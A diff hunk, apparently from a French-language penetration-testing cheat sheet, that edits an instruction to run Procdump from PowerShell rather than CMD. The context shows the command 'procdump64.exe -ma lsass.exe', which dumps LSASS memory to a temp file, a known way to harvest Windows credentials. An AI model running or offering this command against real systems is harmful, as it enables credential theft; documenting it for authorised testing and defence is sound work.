@@ -948,7 +948,7 @@ lsass.exe
 ```
 
 
-Exécuter Procdump dans l'invite système CMD et envoyer le fichier dump dans C:\Windows\Temp\Procdump
+Exécuter Procdump dans l'invite système powershell et envoyer le fichier dump dans C:\Windows\Temp\Procdump
 ```bat
 cd C:\Windows\Temp\Dump\Procdump
 procdump64.exe -ma lsass.exe C:\Windows\Temp\Dump\lsadump.dmp
